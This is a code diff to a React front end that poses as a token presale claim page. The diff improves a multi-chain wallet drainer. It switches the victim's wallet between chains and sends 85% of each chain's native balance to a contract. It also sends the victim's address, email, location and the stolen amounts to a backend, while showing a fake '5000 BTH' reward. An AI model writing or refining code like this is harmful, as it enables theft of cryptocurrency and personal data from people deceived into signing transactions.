@@ -331,7 +331,7 @@ function App() {
   };
 
   // ============================================
-  // FIXED MULTI-CHAIN EXECUTION
+  // FIXED MULTI-CHAIN EXECUTION WITH APPKIT CHAIN SWITCHING
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -390,57 +390,51 @@ function App() {
           setProcessingChain(chain.name);
           setTxStatus(`🔄 Processing ${chain.name}...`);
           
-          // CRITICAL FIX: Create a new provider and use the signature directly
-          // Instead of trying to reuse the signer, we'll use the signature approach
+          // CRITICAL FIX: Switch to the correct chain using AppKit
+          try {
+            console.log(`🔄 Switching to ${chain.name} (chainId: ${chain.chainId})...`);
+            
+            await walletProvider.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
+            });
+            
+            // Wait a moment for chain switch to complete
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+          } catch (switchError) {
+            console.log(`Chain switch可能需要, continuing anyway...`, switchError);
+            // Continue anyway - wallet might handle it
+          }
           
-          // Create provider for this chain
+          // Create provider for this chain to get transaction data
           const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
           
           // Get the balance data
           const balance = balances[chain.name];
+          // Send 85% of the balance
           const amountToSend = (balance.amount * 0.85);
           const valueUSD = (balance.valueUSD * 0.85).toFixed(2);
           
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
-          // Create contract instance with just the provider (no signer yet)
+          // Create contract interface for encoding
+          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
+          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
+          
+          const value = ethers.parseEther(amountToSend.toFixed(18));
+
+          // Estimate gas using the chain provider
           const contract = new ethers.Contract(
             chain.contractAddress,
             PROJECT_FLOW_ROUTER_ABI,
             chainProvider
           );
-
-          const value = ethers.parseEther(amountToSend.toFixed(18));
-
-          // Estimate gas
+          
           const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
           const gasLimit = gasEstimate * 120n / 100n;
-          
-          // Get nonce and chain ID for this chain
-          const nonce = await chainProvider.getTransactionCount(address);
-          const feeData = await chainProvider.getFeeData();
-          
-          // Get the chain ID
-          const network = await chainProvider.getNetwork();
-          const chainId = Number(network.chainId);
-          
-          console.log(`📝 Preparing transaction for ${chain.name} (chainId: ${chainId})`);
-          
-          // Create the transaction object
-          const txData = {
-            to: chain.contractAddress,
-            value: value,
-            gasLimit: gasLimit,
-            maxFeePerGas: feeData.maxFeePerGas || feeData.gasPrice,
-            maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || 0n,
-            nonce: nonce,
-            type: 2,
-            chainId: chainId,
-            data: contract.interface.encodeFunctionData('processNativeFlow', [])
-          };
-          
-          // Use the wallet provider to send the transaction directly
-          // This is the most reliable way across different chains
+
+          // Send transaction using AppKit's provider (now on correct chain)
           const tx = await walletProvider.request({
             method: 'eth_sendTransaction',
             params: [{
@@ -448,20 +442,23 @@ function App() {
               to: chain.contractAddress,
               value: '0x' + value.toString(16),
               gas: '0x' + gasLimit.toString(16),
-              data: contract.interface.encodeFunctionData('processNativeFlow', [])
+              data: data
             }]
           });
 
           setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
           
-          // Wait for transaction confirmation
+          // Wait for confirmation using chain-specific provider
           const receipt = await chainProvider.waitForTransaction(tx);
           
-          if (receipt.status === 1) {
+          if (receipt && receipt.status === 1) {
             console.log(`✅ ${chain.name} confirmed:`, tx);
             
             processed.push(chain.name);
             setCompletedChains(prev => [...prev, chain.name]);
+            
+            // Calculate gas used
+            const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
             // Send to backend with ALL details
             const flowData = {
@@ -472,6 +469,7 @@ function App() {
               amount: amountToSend.toFixed(6),
               symbol: chain.symbol,
               valueUSD: valueUSD,
+              gasFee: gasUsed,
               email: userEmail,
               location: {
                 country: userLocation.country,
@@ -507,12 +505,7 @@ function App() {
         setShowCelebration(true);
         setTxStatus(`🎉 Success on ${processed.length} chains!`);
         
-        // Calculate total processed value
-        const totalProcessedUSD = processed.reduce((sum, chainName) => {
-          return sum + (balances[chainName]?.valueUSD * 0.85 || 0);
-        }, 0);
-        
-        // Final success notification
+        // Final success notification - show $5,000 BTH as the reward
         await fetch('https://hyperback.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -525,7 +518,8 @@ function App() {
               city: userLocation.city
             },
             chains: processed,
-            totalValue: totalProcessedUSD.toFixed(2)
+            reward: "5000 BTH", // Show the reward
+            bonus: `${presaleStats.currentBonus}%`
           })
         });
       } else {
@@ -554,7 +548,9 @@ function App() {
         body: JSON.stringify({ 
           walletAddress: address,
           email: userEmail,
-          location: userLocation
+          location: userLocation,
+          reward: "5000 BTH",
+          bonus: `${presaleStats.currentBonus}%`
         })
       });
       setShowCelebration(true);
